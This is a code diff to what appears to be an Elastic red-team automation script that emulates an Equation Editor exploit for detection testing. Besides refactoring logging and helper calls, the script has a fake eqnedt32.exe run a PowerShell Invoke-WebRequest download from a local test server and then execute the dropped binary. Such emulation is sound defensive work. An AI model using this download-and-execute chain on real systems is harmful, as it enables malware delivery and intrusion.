@@ -3,7 +3,11 @@
 # 2.0; you may not use this file except in compliance with the Elastic License
 # 2.0.
 
-from . import _common, RuleMetadata, register_code_rta, OSType
+import logging
+
+from . import OSType, RuleMetadata, _common, register_code_rta
+
+log = logging.getLogger(__name__)
 
 
 @register_code_rta(
@@ -21,9 +25,9 @@ from . import _common, RuleMetadata, register_code_rta, OSType
     techniques=["T1203", "T1566"],
 )
 def main():
-    EXE_FILE = _common.get_path("bin", "renamed_posh.exe")
+    EXE_FILE = _common.get_resource_path("bin/renamed_posh.exe")
 
-    server, ip, port = _common.serve_web()
+    server, ip, port = _common.serve_dir_over_http()
     url = f"http://{ip}:{port}/bin/renamed_posh.exe"
 
     eqnedt32 = "C:\\Users\\Public\\eqnedt32.exe"
@@ -33,8 +37,8 @@ def main():
     cmd = f"Invoke-WebRequest -Uri {url} -OutFile {dropped}"
 
     # Execute command
-    _common.log("Using a fake eqnedt32 to drop and execute an .exe")
-    _common.execute([eqnedt32, "/c", cmd], timeout=10)
-    _common.execute([eqnedt32, "/c", dropped], timeout=10, kill=True)
+    log.info("Using a fake eqnedt32 to drop and execute an .exe")
+    _ = _common.execute_command([eqnedt32, "/c", cmd], timeout_secs=10)
+    _ = _common.execute_command([eqnedt32, "/c", dropped], timeout_secs=10, kill=True)
     _common.remove_file(eqnedt32)
     _common.remove_file(dropped)
